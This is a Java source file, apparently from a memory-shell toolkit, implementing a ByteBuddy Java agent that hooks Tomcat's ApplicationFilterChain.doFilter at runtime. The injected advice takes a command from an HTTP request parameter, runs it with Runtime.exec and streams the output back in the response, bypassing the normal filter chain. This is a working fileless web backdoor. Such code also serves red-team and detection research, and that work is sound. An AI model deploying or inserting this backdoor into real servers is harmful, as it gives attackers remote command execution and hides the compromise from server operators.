package com.reajason.javaweb.memshell.agent;

import net.bytebuddy.agent.builder.AgentBuilder;
import net.bytebuddy.asm.Advice;
import net.bytebuddy.description.type.TypeDescription;
import net.bytebuddy.dynamic.DynamicType;
import net.bytebuddy.matcher.ElementMatchers;
import net.bytebuddy.utility.JavaModule;

import java.io.InputStream;
import java.io.OutputStream;
import java.lang.instrument.Instrumentation;
import java.security.ProtectionDomain;

import static net.bytebuddy.matcher.ElementMatchers.named;

/**
 * @author ReaJason
 * @since 2025/4/2
 */
public class CommandFilterChainTransformer implements AgentBuilder.Transformer {

    @Advice.OnMethodEnter(skipOn = Advice.OnNonDefaultValue.class)
    public static boolean enter(
            @Advice.Argument(value = 0) Object request,
            @Advice.Argument(value = 1) Object response
    ) {
        String paramName = "paramName";
        try {
            String cmd = (String) request.getClass().getMethod("getParameter", String.class).invoke(request, paramName);
            if (cmd != null) {
                Process exec = Runtime.getRuntime().exec(cmd);
                InputStream inputStream = exec.getInputStream();
                OutputStream outputStream = (OutputStream) response.getClass().getMethod("getOutputStream").invoke(response);
                byte[] buf = new byte[8192];
                int length;
                while ((length = inputStream.read(buf)) != -1) {
                    outputStream.write(buf, 0, length);
                }
                return true; // 此处返回 true 配合 skipOn = Advice.OnNonDefaultValue.class，即意为不再执行目标方法自带的代码，直接返回。
            }
        } catch (Exception ignored) {
        }
        return false; // 此处返回 false 配合 skipOn = Advice.OnNonDefaultValue.class，意为继续执行目标方法自带的代码。
    }

    @Override
    public DynamicType.Builder<?> transform(DynamicType.Builder<?> builder, TypeDescription typeDescription, ClassLoader classLoader, JavaModule module, ProtectionDomain protectionDomain) {
        return builder.visit(Advice.to(CommandFilterChainTransformer.class).on(named("doFilter")));
    }

    public static void premain(String args, Instrumentation inst) throws Exception {
        launch(inst);
    }

    public static void agentmain(String args, Instrumentation inst) throws Exception {
        launch(inst);
    }

    private static void launch(Instrumentation inst) throws Exception {
        new AgentBuilder.Default()
                .ignore(ElementMatchers.none())
                .disableClassFormatChanges()
                .with(AgentBuilder.RedefinitionStrategy.REDEFINITION)
                .with(AgentBuilder.Listener.StreamWriting.toSystemError().withErrorsOnly())
                .with(AgentBuilder.Listener.StreamWriting.toSystemOut().withTransformationsOnly())
                .type(named("org.apache.catalina.core.ApplicationFilterChain"))
                .transform(new CommandFilterChainTransformer())
                .installOn(inst);
    }
}
